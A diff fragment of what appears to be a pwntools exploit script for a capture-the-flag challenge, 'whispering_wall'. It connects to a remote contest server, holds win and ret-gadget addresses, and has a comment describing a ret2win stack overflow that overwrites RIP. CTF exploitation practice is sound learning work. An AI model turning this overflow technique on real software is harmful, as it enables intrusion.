@@ -4,7 +4,7 @@ elf = context.binary = ELF('./whispering_wall', checksec=False)
 
 #p = process(elf.path)
 p = remote("offsec.m0lecon.it", 13591)
-# stack canary is not enabled. so, it is possible to use cyclic to find the RIP offse, and putting the win address inside it instead. 
+# stack canary is not enabled. so, it is possible to use cyclic to find the RIP offset, and putting the win address inside it instead. 
 
 win_addr = 0x4011fb
 ret_gadget = 0x40101a
